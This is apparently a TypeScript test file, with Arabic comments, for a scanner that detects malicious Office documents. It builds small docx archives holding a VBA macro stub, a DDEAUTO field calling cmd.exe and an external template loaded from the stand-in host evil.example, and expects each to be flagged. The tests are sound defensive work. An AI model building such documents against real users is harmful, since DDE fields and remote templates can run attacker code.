/**
 * اختبارات فحص OOXML: ماكرو، DDE، قالب خارجي، ومستند نظيف.
 * التشغيل: bun scripts/deep-scan-ooxml.test.ts
 */
import { deepScanBytes } from "../src/lib/file-security/deep-scan/index.server";

let failures = 0;
function check(name: string, condition: boolean) {
  if (condition) console.log(`✓ ${name}`);
  else {
    failures += 1;
    console.error(`✗ ${name}`);
  }
}

const encoder = new TextEncoder();

/** يبني أرشيف ZIP بمدخلات غير مضغوطة (method 0) لاختبار الفهرس والقراءة. */
function buildZip(files: { name: string; content: string }[]): Uint8Array {
  const parts: Uint8Array[] = [];
  const central: Uint8Array[] = [];
  let offset = 0;

  for (const file of files) {
    const nameBytes = encoder.encode(file.name);
    const data = encoder.encode(file.content);
    const local = new Uint8Array(30 + nameBytes.length + data.length);
    const localView = new DataView(local.buffer);
    localView.setUint32(0, 0x04034b50, true);
    localView.setUint16(4, 20, true);
    localView.setUint16(8, 0, true); // stored
    localView.setUint32(14, 0, true); // crc (غير مستخدم في الفحص)
    localView.setUint32(18, data.length, true);
    localView.setUint32(22, data.length, true);
    localView.setUint16(26, nameBytes.length, true);
    local.set(nameBytes, 30);
    local.set(data, 30 + nameBytes.length);
    parts.push(local);

    const header = new Uint8Array(46 + nameBytes.length);
    const headerView = new DataView(header.buffer);
    headerView.setUint32(0, 0x02014b50, true);
    headerView.setUint16(10, 0, true);
    headerView.setUint32(20, data.length, true);
    headerView.setUint32(24, data.length, true);
    headerView.setUint16(28, nameBytes.length, true);
    headerView.setUint32(42, offset, true);
    header.set(nameBytes, 46);
    central.push(header);
    offset += local.length;
  }

  const centralSize = central.reduce((sum, part) => sum + part.length, 0);
  const eocd = new Uint8Array(22);
  const eocdView = new DataView(eocd.buffer);
  eocdView.setUint32(0, 0x06054b50, true);
  eocdView.setUint16(8, files.length, true);
  eocdView.setUint16(10, files.length, true);
  eocdView.setUint32(12, centralSize, true);
  eocdView.setUint32(16, offset, true);

  const total = [...parts, ...central, eocd];
  const out = new Uint8Array(total.reduce((sum, part) => sum + part.length, 0));
  let cursor = 0;
  for (const part of total) {
    out.set(part, cursor);
    cursor += part.length;
  }
  return out;
}

const cleanDoc = buildZip([
  { name: "[Content_Types].xml", content: "<Types/>" },
  { name: "word/document.xml", content: "<w:document><w:body>نص</w:body></w:document>" },
]);
const macroDoc = buildZip([
  { name: "word/document.xml", content: "<w:document/>" },
  { name: "word/vbaProject.bin", content: "binary-macro" },
]);
const ddeDoc = buildZip([
  {
    name: "word/document.xml",
    content: '<w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe </w:instrText>',
  },
]);
const templateDoc = buildZip([
  {
    name: "word/_rels/settings.xml.rels",
    content:
      '<Relationships><Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/x.dotm" TargetMode="External"/></Relationships>',
  },
]);

const [clean, macro, dde, template, broken] = await Promise.all([
  deepScanBytes("docx", cleanDoc),
  deepScanBytes("docx", macroDoc),
  deepScanBytes("docx", ddeDoc),
  deepScanBytes("docx", templateDoc),
  deepScanBytes("docx", encoder.encode("PK not-a-zip")),
]);

check("مستند docx نظيف يُقبل", clean!.verdict === "clean");
check("ماكرو VBA يُرفض", macro!.verdict === "malicious");
check("حقل DDE يُرفض", dde!.verdict === "malicious");
check("قالب خارجي يُرفض", template!.verdict === "malicious");
check("أرشيف تالف يُرفض", broken!.verdict === "malicious");

if (failures > 0) {
  console.error(`\n${failures} اختبار فاشل.`);
  process.exit(1);
}
console.log("\nجميع اختبارات فحص OOXML ناجحة.");